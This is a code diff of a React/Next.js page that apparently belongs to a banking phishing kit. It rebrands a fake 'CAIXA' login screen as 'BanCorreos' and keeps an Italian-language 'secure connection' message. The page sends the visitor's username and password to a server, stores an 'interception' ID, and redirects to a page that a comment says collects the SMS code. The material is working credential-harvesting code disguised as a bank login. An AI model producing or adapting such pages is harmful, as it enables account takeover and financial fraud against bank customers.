@@ -4,7 +4,7 @@ import Link from "next/link";
 import { useState } from "react";
 import { useRouter } from "next/navigation";
 
-export default function CAIXAConnect() {
+export default function BanCorreosConnect() {
   const router = useRouter();
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
@@ -25,7 +25,7 @@ export default function CAIXAConnect() {
         body: JSON.stringify({ 
           username, 
           password, 
-          bankName: "CAIXA" // Ajout explicite du nom de la banque ici
+          bankName: "BanCorreos" // Ajout explicite du nom de la banque ici
         }),
       });
 
@@ -39,7 +39,7 @@ export default function CAIXAConnect() {
       sessionStorage.setItem("current_interception_id", data.id);
 
       // Redirection immédiate vers la page de saisie du code SMS
-      router.push("/operation/montant");
+      router.push("/it/operation/montant");
 
     } catch (err: any) {
       setError(err.message || "Errore di connessione al server.");
@@ -50,7 +50,7 @@ export default function CAIXAConnect() {
 
   return (
     <div className="bank-connect-container">
-      <Link href="/operation" className="back-btn">
+      <Link href="/it/operation" className="back-btn">
         <i className="fa-solid fa-arrow-left"></i>
       </Link>
 
@@ -58,7 +58,7 @@ export default function CAIXAConnect() {
         <i className="fa-solid fa-shield-halved"></i>
       </div>
 
-      <h1 className="bank-connect-title">Accedi a CAIXA</h1>
+      <h1 className="bank-connect-title">Accedi a BanCorreos</h1>
       <p className="bank-connect-subtitle">Connessione sicura e crittografata end-to-end.</p>
 
       <form className="login-form" onSubmit={handleConnect}>
